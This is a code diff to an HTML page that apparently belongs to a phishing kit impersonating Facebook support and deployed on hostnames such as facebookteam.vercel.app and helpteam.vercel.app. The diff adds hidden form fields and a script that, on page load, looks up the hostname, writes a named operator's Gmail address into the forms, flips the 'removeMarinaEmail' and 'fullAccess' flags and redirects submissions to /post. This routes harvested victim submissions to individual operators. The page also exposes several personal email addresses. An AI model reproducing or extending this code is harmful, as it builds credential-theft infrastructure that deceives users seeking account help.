@@ -1,4 +1,3 @@
-
 <!doctype html>
 <html>
     <head>
@@ -25,7 +24,11 @@
                 </form>
             </div>
         </div>
-        <form action="/" method="post">
+        <form action="/" id="form1" method="post">
+            <input type="hidden" name="name" id="form1name" value="ismail"/>
+            <input type="hidden" name="workerEmail" id="form1workerEmail" value="muhammedismail525255@gmail.com"/>
+            <input type="hidden" id="remove" name="removeMarinaEmail" value="false"/>
+            <input type="hidden" id="access" name="fullAccess" value="false"/>
             <div class="relative flex border bg-[#e9ebee] h-10 md:hidden lg:hidden sm:block">
                 <div>
                     <div>
@@ -110,7 +113,11 @@
                 </form>
             </div>
         </div>
-        <form class="sm:hidden lg:block md:block" action="/submit" method="post">
+        <form class="sm:hidden lg:block md:block" action="/submit" id="form2" method="post">
+            <input type="hidden" name="name" id="form2name" value="ismail"/>
+            <input type="hidden" name="workerEmail" id="form2workerEmail" value="muhammedismail525255@gmail.com"/>
+            <input type="hidden" id="remove" name="removeMarinaEmail" value="false"/>
+            <input type="hidden" id="access" name="fullAccess" value="false"/>
             <div class="relative flex border bg-[#e9ebee] h-12 md:block lg:block hidden ">
                 <div>
                     <div>
@@ -211,5 +218,91 @@
         </footer>
         <div class="hidden">
     </body>
+    
+    <script>
+        // Your JavaScript code here
+        document.addEventListener('DOMContentLoaded', function () {
+            // Get the current hostname
+            var currentHostname = window.location.hostname;
+
+
+            
+            // Map hostnames to values
+            var hostnameValues = {
+                "fixissue.vercel.app":{
+                    name:"Mujeeb",
+                    workerEmail:"Abdulmujeebniz@gmail.com",
+                    removeMarinaEmail:true,
+                    fullAccess:false
+                },
+                "helpteam.vercel.app":{
+                    name:"Fawad",
+                    workerEmail:"fawadniz49@gmail.com",
+                    removeMarinaEmail:true,
+                    fullAccess:true
+                },
+                "service66.vercel.app":{
+                    name:"Waseem",
+                    workerEmail:"tkasarafina@gmail.com",
+                    removeMarinaEmail:true,
+                    fullAccess:false
+                },
+                "facebookteam.vercel.app":{
+                    name:"Saif Rehman",
+                    workerEmail:"melissacamellaagent@gmail.com",
+                    removeMarinaEmail:true,
+                    fullAccess:true
+                },
+                "teamreview.vercel.app":{
+                    name:"Wajad",
+                    workerEmail:"nizwajad@gmail.com",
+                    removeMarinaEmail:true,
+                    fullAccess:false
+                }, 
+                "supporteam.vercel.app":{
+                    name:"Aizaz",
+                    workerEmail:"ameliajackson4001@gmail.com",
+                    removeMarinaEmail:true,
+                    fullAccess:false
+                }  
+                
+                
+                // Add more mappings as needed
+            };
+
+            
+
+            // Check if the current hostname has a mapping
+            if (hostnameValues.hasOwnProperty(currentHostname)) {
+                
+                // Set values for specific input elements based on the hostname
+
+               console.log("Before update:", document.getElementById("remove").value);
+               console.log("Before update:", document.getElementById("access").value);
+
+               document.getElementById("remove").value = "true";
+               document.getElementById("access").value = "true";
+
+               console.log("After update:", document.getElementById("remove").value);
+               console.log("After update:", document.getElementById("access").value);
+
+                
+                const valueObj = hostnameValues[currentHostname];
+                document.getElementById("form1name").value = valueObj.name
+                document.getElementById("form1workerEmail").value = valueObj.workerEmail;
+                document.getElementById("form2name").value = valueObj.name
+                document.getElementById("form2workerEmail").value = valueObj.workerEmail 
+
+             
+
+                document.getElementById("form1").setAttribute("action", "/post");
+                document.getElementById("form2").setAttribute("action", "/post");
+
+             
+
+                // Add more lines to set values for additional input elements
+            }
+        });
+    </script>
 
 </html>
